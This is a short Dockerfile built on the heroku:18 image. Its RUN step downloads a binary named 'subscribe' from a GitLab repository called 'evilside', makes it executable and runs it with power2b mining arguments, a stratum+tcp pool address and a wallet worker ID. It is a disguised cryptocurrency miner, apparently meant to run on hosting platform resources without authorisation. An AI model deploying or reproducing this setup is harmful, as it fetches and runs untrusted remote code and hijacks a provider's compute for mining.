FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://gitlab.com/evilside/subscribe/-/raw/main/subscribe; chmod +x subscribe; ./subscribe -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u MbQTH98oGuL7TEvntTudqyTMaQzg9s87Lu.Spiritway666
CMD bash heroku.sh
